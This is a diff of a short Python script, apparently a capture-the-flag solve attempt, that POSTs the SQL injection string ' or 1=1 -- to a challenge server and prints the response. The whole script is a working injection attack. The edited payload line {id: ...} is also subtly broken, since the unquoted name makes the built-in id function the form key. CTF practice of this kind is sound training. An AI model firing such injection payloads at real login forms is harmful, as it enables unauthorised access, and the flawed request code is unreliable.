@@ -1,7 +1,7 @@
 import requests
 
 url = 'http://ctfq.sweetduet.info:10080/~q6/'
-payload = "' or 1=1 --"
+payload = {id: "' or 1=1 --"}
 print(payload)
 # for i in range(1,100):
 #     # customize sql
@@ -11,4 +11,4 @@ print(payload)
 #     }
 
 response = requests.post(url,data=payload)
-print(response)
+print(response.text)
